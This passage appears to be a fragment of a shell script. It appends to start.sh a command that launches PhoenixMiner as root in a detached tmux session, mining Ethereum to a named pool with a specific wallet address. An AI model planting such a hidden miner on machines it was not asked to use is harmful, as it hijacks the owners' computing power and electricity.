...
echo "sudo tmux new-session -d -s SANS './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu-eth.hiveon.net:4444 -wal 0x099e01ed1552e18c4c58ab80bb64c38ceb7d62e1.VIP2021 -pass x'">>start.sh
